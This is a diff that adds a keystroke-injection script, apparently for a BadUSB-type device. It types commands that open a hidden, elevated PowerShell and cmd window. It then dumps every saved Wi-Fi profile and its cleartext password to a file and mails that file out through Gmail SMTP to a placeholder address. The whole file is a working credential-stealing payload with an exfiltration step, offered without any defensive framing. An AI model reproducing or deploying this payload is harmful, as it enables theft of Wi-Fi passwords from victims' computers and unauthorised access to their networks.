@@ -1,0 +1,12 @@
+Press:131+114
+CustomDelay:1
+Print:powershell -NoP -NonI -W Hidden -Exec Bypass "Start-Process cmd -A '/t:fe /k mode con lines=1 cols=18' -Verb runAs"
+Press:176
+Press:130+121
+Press:176
+Print:powershell -NoP -c " ((netsh wlan show profiles) | Select-String “\:(.+)$” | %{$name=$_.Matches.Groups[1].Value.Trim(); $_} | %{(netsh wlan show profile name=”$name” key=clear)} | Select-String “Key Content\W+\:(.+)$” | %{$pass=$_.Matches.Groups[1].Value.Trim(); $_} | %{[PSCustomObject]@{ PROFILE_NAME=$name;PASSWORD=$pass }} | Format-Table -AutoSize) > c:\\wifi.txt"
+Press:176
+Print:powershell -c "$msg = new-object Net.Mail.MailMessage; $smtp = new-object Net.Mail.SmtpClient('smtp.gmail.com'); $smtp.EnableSsl = $true; $msg.From = 'xxxxxx@gmail.com'; $msg.To.Add('xxxxx@gmail.com'); $msg.SubjectEncoding = [system.Text.Encoding]::Unicode; $msg.Subject = 'Test mail from PS'; $msg.Body = 'Test mail from PS '; $msg.Attachments.Add('c:\\\\wifi.txt'); $smtp.Credentials = New-Object System.Net.NetworkCredential('xxxxx@gmail.com', 'xxxx');$smtp.Send($msg);exit"
+Press:176
+Print:exit
+Press:176
